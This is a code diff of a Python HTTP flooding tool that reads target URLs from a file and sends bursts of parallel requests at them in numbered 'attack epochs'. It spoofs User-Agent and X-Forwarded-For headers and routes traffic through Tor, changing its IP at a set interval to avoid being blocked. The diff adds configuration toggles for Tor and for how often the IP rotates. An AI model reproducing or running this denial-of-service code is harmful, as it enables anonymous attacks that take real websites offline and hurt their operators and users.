@@ -17,9 +17,9 @@ from stem import Signal
 from stem.control import Controller
 
 
-
+# Important global variables
+#-----------------------------------------------------------------------------------------------------------------------
 utils_random = UtilsRandom()
-
 
 HTTP_STATUS_CODE_SUCCESS = 200
 HTTP_STATUS_CODE_UNAUTHORIZED = 401
@@ -41,10 +41,49 @@ HTTP_STATUS_CODE_EXCEPTION_TIMEOUT = -7000
 HTTP_STATUS_CODE_EXCEPTION_SERVER_DISCONNECTED_ERROR = -8000
 HTTP_STATUS_CODE_EXCEPTION_CLIENT_OS_ERROR = -9000
 
-
 TOR_CHANGE_IP_LOCK = threading.Lock()
+#-----------------------------------------------------------------------------------------------------------------------
 
 
+
+# Configuration
+#-----------------------------------------------------------------------------------------------------------------------
+# Load configuration
+NUMBER_OF_EPOCHS = int(os.environ['NUMBER_OF_EPOCHS'])
+PARALLEL_SINGLE_URL_MIN_REQUESTS = int(os.environ['PARALLEL_SINGLE_URL_MIN_REQUESTS'])
+PARALLEL_SINGLE_URL_MAX_REQUESTS = int(os.environ['PARALLEL_SINGLE_URL_MAX_REQUESTS'])
+ENABLE_TOR = bool(int(os.environ['ENABLE_TOR']))
+TOR_IP_CHANGE_FREQUENCY = int(os.environ['TOR_IP_CHANGE_FREQUENCY'])
+TOR_IP_CHANGE_ALLOWED = TOR_IP_CHANGE_FREQUENCY > 0
+
+# Load targets
+LIST_OF_URLS = []
+with open('targets.txt') as f:
+    lines = f.readlines()
+    lines = [l.strip() for l in lines]
+    lines = [l for l in lines if len(l) > 0]
+    LIST_OF_URLS.extend(lines)
+
+# Load randomized headers
+LIST_OF_HEADERS = [
+    {
+        'User-Agent': utils_random.get_random_user_agent(),
+        'X-Forwarded-For': utils_random.get_random_ip(),
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+        'Accept-Language': 'en-us,en;q=0.5',
+        'Accept-Encoding': 'gzip,deflate',
+        'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
+        'Keep-Alive': '115',
+        'Connection': 'keep-alive',
+    }
+    for i in range(0, 200)
+]
+#-----------------------------------------------------------------------------------------------------------------------
+
+
+
+# HTTP calls
+#-----------------------------------------------------------------------------------------------------------------------
 async def http_get_with_aiohttp(session: ClientSession, url: str, headers: Dict = {}, proxy: str = None, timeout: int = 10, ignore_json: bool = False, ignore_body: bool = False) -> (int, Dict[str, Any], bytes):
     # Make request
     try:
@@ -146,6 +185,7 @@ def debug_stats(url: str, results: List[Tuple[int, Dict[str, Any], bytes]], t: f
 
     print('debug_stats(): Execution time is ' + str(round(t, 2)) + ' s,' + ' speed is ' + str(round(len(results) / t, 2)) + ' r/s')
     print('debug_stats(): ')
+#-----------------------------------------------------------------------------------------------------------------------
 
 
 
@@ -167,36 +207,9 @@ async def check_my_ip_with_tor(session: ClientSession) -> (int, Dict[str, Any], 
 #-----------------------------------------------------------------------------------------------------------------------
 
 
-# Load configuration
-NUMBER_OF_EPOCHS = int(os.environ['NUMBER_OF_EPOCHS'])
-PARALLEL_SINGLE_URL_MIN_REQUESTS = int(os.environ['PARALLEL_SINGLE_URL_MIN_REQUESTS'])
-PARALLEL_SINGLE_URL_MAX_REQUESTS = int(os.environ['PARALLEL_SINGLE_URL_MAX_REQUESTS'])
 
-# Load targets
-LIST_OF_URLS = []
-with open('targets.txt') as f:
-    lines = f.readlines()
-    lines = [l.strip() for l in lines]
-    lines = [l for l in lines if len(l) > 0]
-    LIST_OF_URLS.extend(lines)
-
-# Load randomized headers
-LIST_OF_HEADERS = [
-    {
-        'User-Agent': utils_random.get_random_user_agent(),
-        'X-Forwarded-For': utils_random.get_random_ip(),
-        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-        'Accept-Language': 'en-us,en;q=0.5',
-        'Accept-Encoding': 'gzip,deflate',
-        'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
-        'Keep-Alive': '115',
-        'Connection': 'keep-alive',
-    }
-    for i in range(0, 100)
-]
-
-
-
+# Main attack
+#-----------------------------------------------------------------------------------------------------------------------
 async def epoch(epoch_number: int):
     print('\n\n------- Attack Epoch #' + str(epoch_number) + ' -------')
 
@@ -212,13 +225,18 @@ async def epoch(epoch_number: int):
         target_url = LIST_OF_URLS[i]
 
         # If needed - change IP
-        if i % 4 == 0:
-            change_ip_tor()
-            await check_my_ip_with_tor(session)
+        if ENABLE_TOR and TOR_IP_CHANGE_ALLOWED:
+            if i % TOR_IP_CHANGE_FREQUENCY == 0:
+                change_ip_tor()
+                await check_my_ip_with_tor(session)
 
         # Gen headers and proxy
         headers = random.choice(LIST_OF_HEADERS)
-        proxy = "http://127.0.0.1:8118"
+        proxy = None
+        if ENABLE_TOR:
+            proxy = "http://127.0.0.1:8118"
+        else:
+            print('epoch(): WARNING!!!! TOR is disabled!!!!')
 
         # Determine how many requests we need to make
         number_of_requests = random.randint(PARALLEL_SINGLE_URL_MIN_REQUESTS, PARALLEL_SINGLE_URL_MAX_REQUESTS)
@@ -240,3 +258,4 @@ async def main():
 
 
 asyncio.run(main())
+#-----------------------------------------------------------------------------------------------------------------------
